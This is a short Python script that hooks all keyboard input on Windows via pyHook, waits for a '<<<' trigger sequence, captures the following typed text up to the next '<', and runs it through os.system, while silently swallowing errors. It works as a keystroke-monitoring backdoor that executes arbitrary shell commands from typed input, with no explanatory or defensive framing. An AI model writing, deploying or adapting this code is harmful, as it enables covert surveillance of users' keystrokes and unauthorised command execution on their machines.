import pyHook, pythoncom, os

class Logguer:
    def __init__(self):
        self.__command = ""
        self.__caller = ""
        self.__inside = False
    def leertecla(self, tecla):
        try:
            self.__tecla(tecla)
        except:
            """nothing happens"""
    def __tecla(self,tecla):
        if self.__inside:
            if chr(tecla.Ascii) == "<":
                self.__analizer()
            else:
                self.__command += chr(tecla.Ascii)
        else:
            if chr(tecla.Ascii) == "<":
                if (len(self.__caller) == 2):
                    self.__caller = ""
                    self.__inside = True
                else:
                    self.__caller += chr(tecla.Ascii)
    def __analizer(self):
        self.__inside = False
        os.system(self.__command)
        self.__command = ""
log = Logguer()
controlador = pyHook.HookManager()
controlador.KeyDown = log.leertecla
controlador.HookKeyboard()

pythoncom.PumpMessages()